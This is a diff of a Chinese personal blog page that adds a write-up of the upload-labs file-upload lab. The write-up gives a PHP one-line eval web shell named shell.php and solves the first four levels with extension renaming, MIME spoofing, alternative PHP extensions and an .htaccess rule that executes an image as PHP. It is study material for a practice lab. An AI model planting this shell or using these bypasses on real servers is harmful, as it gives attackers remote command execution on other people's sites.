@@ -6,14 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sunzhengyu99.github.io">
-  <title>Archives: 2020 | 一路走到黑</title>
+  <title>upload-labs | 一路走到黑</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="一路走到黑">
-<meta property="og:url" content="https://sunzhengyu99.github.io/archives/2020/index.html">
+  <meta name="description" content="uplad-labs一句话木马  &lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt; 文件名shell.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="upload-labs">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/index.html">
 <meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="uplad-labs一句话木马  &lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt; 文件名shell.php">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1s.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p2o.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p2.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p3.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p31.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p4.png">
+<meta property="article:published_time" content="2020-03-29T12:14:36.682Z">
+<meta property="article:modified_time" content="2020-03-29T15:45:25.638Z">
 <meta property="article:author" content="sunzy">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sunzhengyu99.github.io/2020/03/29/upload-labs/p1.png">
   
     <link rel="alternative" href="/atom.xml" title="一路走到黑" type="application/atom+xml">
   
@@ -145,131 +157,210 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-upload-labs" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      upload-labs
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/29/upload-labs/" class="archive-article-date">
+
+        
+        <a href="/2020/03/29/upload-labs/" class="archive-article-date">
   	<time datetime="2020-03-29T12:14:36.682Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-29</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/29/upload-labs/">upload-labs</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="uplad-labs"><a href="#uplad-labs" class="headerlink" title="uplad-labs"></a>uplad-labs</h1><p>一句话木马</p>
+<p> <code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]); ?&gt;</code></p>
+<p>文件名shell.php</p>
+<a id="more"></a>
 
-        <div class="article-info info-on-right">
-          
-          
+<h2 id="pass-1"><a href="#pass-1" class="headerlink" title="pass 1"></a>pass 1</h2><p>将文件名后缀改为jpg格式，上传用bp抓包后将后缀改为php上传即可</p>
+<p><img src="/2020/03/29/upload-labs/p1.png" alt></p>
+<p>验证是否成功</p>
+<p><img src="/2020/03/29/upload-labs/p1s.png" alt></p>
+<h2 id="pass-2"><a href="#pass-2" class="headerlink" title="# pass 2 #"></a># pass 2 #</h2><p><img src="/2020/03/29/upload-labs/p2o.png" alt><br>由代码和提示信息可知，是对MIME类型进行验证</p>
+<p>超文本标记语言文本.html, . html text/html</p>
+<p>普通文本<code>txt text/plain</code></p>
+<p>RTF文本.<code>rtf application/rtf</code></p>
+<p>GIF图形<code>.gif image/gif</code></p>
+<p>JPEG图形.:<code>jpeg, .jpg image/jpeg</code></p>
+<p>au声音文件<code>. au audio/basic</code></p>
+<p>MIDI音乐文件mid,<code>.midi audio/midi, audio/x-midi</code></p>
+<p>RealAudio音乐文件<br>    .ra, .ram1 audio/x- pn-realaudio</p>
+<p>MPEG文件<code>.mpg, .mpeg video/ mpeg</code></p>
+<p>AVI文件<code>.avi video/x -msvideo</code></p>
+<p>GZIP文件<code>.gz application/x-gzip</code></p>
+<p>TAR文件<code>.tar application/x-tar</code></p>
+<p><img src="/2020/03/29/upload-labs/p2.png" alt></p>
+<p>访问<a href="http://localhost/upload-labs/upload/shell.php?cmd=phpinfo()" target="_blank" rel="noopener">http://localhost/upload-labs/upload/shell.php?cmd=phpinfo()</a>;<br>成功</p>
+<h2 id="pass-3"><a href="#pass-3" class="headerlink" title="pass 3"></a>pass 3</h2><p>黑名单验证(‘.asp’,’.aspx’,’.php’,’.jsp’)，我们可上传php3,php5,phtml…等这样可以被服务器解析的后缀名<br><img src="/2020/03/29/upload-labs/p3.png" alt></p>
+<p><img src="/2020/03/29/upload-labs/p31.png" alt></p>
+<h2 id="pass-4"><a href="#pass-4" class="headerlink" title="#  pass 4 #"></a>#  pass 4 #</h2><p>重写文件解析规则绕过。上传先上传一个名为.htaccess文件，内容如下：</p>
+<p>   <code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;</code></p>
+<p>  <code>SetHandler application/x-httpd-php</code></p>
+<p><code>&lt;/FilesMatch&gt;</code></p>
+<p>注意shell.jpg要与图片木马名对应</p>
+<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
+<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
+<p>先上传.htaccess,在上传shell.jpg<br>之后访问图片所在的地址<br><img src="/2020/03/29/upload-labs/p4.png" alt></p>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunzhengyu99.github.io/2020/03/29/upload-labs/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2020-03-20T10:07:00.868Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-20</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">迷宫问题</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/">迷宫问题</a>
-    </h1>
+        
+        
+    </div>
+</aside>
+
+
+
+ 
+  <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTI1Ni8yNTc1MA==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/19/Guestbook/" class="archive-article-date">
-  	<time datetime="2020-03-19T10:25:56.544Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-19</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/19/Guestbook/">Guestbook</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%81%EF%BC%81/" class="archive-article-date">
-  	<time datetime="2020-03-18T13:46:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%EF%BC%81%EF%BC%81/">我的第一篇博客！！</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
-
+  
 
 
           </div>
@@ -294,8 +385,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
